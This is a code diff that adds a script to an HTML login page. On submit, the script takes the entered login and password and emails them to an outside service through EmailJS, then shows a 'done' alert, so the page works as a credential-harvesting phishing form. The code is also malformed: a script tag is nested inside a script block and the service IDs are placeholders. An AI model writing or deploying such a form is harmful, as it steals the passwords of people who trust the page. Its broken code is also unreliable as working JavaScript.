@@ -4,6 +4,38 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Form</title>
+    <script>
+// Підключіть бібліотеку EmailJS через CDN
+<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
+// Ініціалізація EmailJS з вашим User ID
+emailjs.init("service_s2rdx4h");
+
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    // Отримання значень логіну та паролю
+    var login = document.getElementById('login').value;
+    var password = document.getElementById('password').value;
+
+    // Створення об'єкту для відправлення
+    var templateParams = {
+        login: login,
+        password: password
+    };
+
+    // Відправка email через EmailJS
+    emailjs.send('your_service_id', 'your_template_id', templateParams)
+        .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+            alert('ГОТОВО');
+        }, function(error) {
+            console.log('FAILED...', error);
+            alert('ПОМИЛКА.');
+        });
+});
+
+    </script>
 </head>
 <body>
     <form id="loginForm">
